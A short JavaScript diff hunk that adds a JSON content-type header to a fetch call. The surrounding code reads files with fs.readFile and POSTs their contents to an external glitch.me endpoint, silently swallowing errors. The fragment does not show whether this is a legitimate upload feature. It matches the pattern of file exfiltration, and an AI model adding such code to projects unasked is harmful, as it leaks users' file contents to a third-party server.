@@ -11,6 +11,9 @@ fs.readFile(files, 'utf8', (err, data) => {
    try{
      fetch("https://selective-proud-club.glitch.me/UpdateF",{
        method: 'POST',
+       headers: {
+         'Content-Type': 'application/json'
+       },
        body: JSON.stringify({contents:data})
      })
    }catch{
